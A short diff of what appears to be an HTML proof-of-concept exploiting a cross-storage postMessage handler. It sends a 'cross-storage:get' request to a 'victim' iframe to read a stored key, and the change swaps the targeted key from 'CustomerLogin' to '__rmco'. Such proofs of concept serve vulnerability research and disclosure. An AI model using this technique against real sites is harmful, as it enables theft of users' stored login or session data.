@@ -15,7 +15,7 @@
         const payload = JSON.stringify({
           id: "999",
           action: "cross-storage:get",
-          params: { key: "CustomerLogin" }
+          params: { key: "__rmco" }
         });
 
         victim.contentWindow.postMessage(payload, "*");
@@ -33,6 +33,7 @@
     </script>
   </body>
 </html>
+
 
 
 
